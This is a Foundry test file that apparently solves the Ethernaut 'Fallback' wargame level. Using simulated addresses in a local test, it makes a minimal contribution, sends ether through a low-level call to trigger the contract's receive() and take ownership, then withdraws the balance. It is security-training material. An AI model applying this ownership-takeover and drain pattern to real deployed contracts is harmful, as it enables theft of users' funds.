pragma solidity ^0.8.10;
import "forge-std/Test.sol";
import {Fallback} from "../src/01-fallback.sol";

contract FallBack01Test is Test {
    Fallback fback;

    function setUp() public {
        console.log(unicode"🧪 Setup Fallback...");
        address bob = address(0xABC);
        vm.prank(bob);
        fback = new Fallback();
        emit log_named_address("At first, the owner is: ", fback.owner());
        emit log_named_address("Test contract address is: ", address(this));
    }

    function testFallback() public {
        console.log(unicode"🧪 Cracking Fallback...");
        address alice = address(0xABCD);
        vm.deal(alice, 100 ether);
        emit log_named_uint("Alice balance is: ", alice.balance);

        vm.startPrank(alice);
        fback.contribute{value: 0.0001 ether}();
        emit log_named_uint("Alice contribution is: ", fback.getContribution());

        //@audit here can not use transfer or send function
        // payable(fback).transfer(0.001 ether);
        // because receive() will change storage variable, will cost more thant 2300 stipend
        // so here must use the low level call function
        (bool success, ) = address(fback).call{value: 1 ether}("");
        require(success);

        fback.withdraw();
        vm.stopPrank();
        console.log(unicode"🧪 Cracking End...");

        emit log_named_uint(
            "At end, the balance of fallback is: ",
            address(fback).balance
        );
        emit log_named_address("Owner change to: ", fback.owner());
    }
}